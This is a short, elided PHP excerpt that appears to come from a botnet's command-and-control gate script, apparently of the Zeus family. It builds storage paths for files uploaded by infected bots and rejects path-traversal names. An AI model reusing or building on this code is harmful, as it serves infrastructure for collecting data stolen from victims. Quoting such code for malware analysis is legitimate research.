...
if(!empty($list[SBCID_BOTLOG]) && !empty($list[SBCID_BOTLOG_TYPE]))
{
  ...
  if($type == BLT_FILE)
  {
    ...
    //Формируем имя файла.
    if(isHackNameForPath($botId) || isHackNameForPath($botnet))die('6');
    $file_root = $config['reports_path'].'/files/'.urlencode($botnet).'/'.urlencode($botId);
    $file_path = $file_root;
    $last_name = '';
    $l = explode('/', (isset($list[SBCID_PATH_SOURCE]) && strlen($list[SBCID_PATH_SOURCE]) > 0 ? str_replace('\\', '/', $list[SBCID_PATH_SOURCE]) : 'unknown'));
    foreach($l as &$k)
    {
      if(isHackNameForPath($k))die('7');
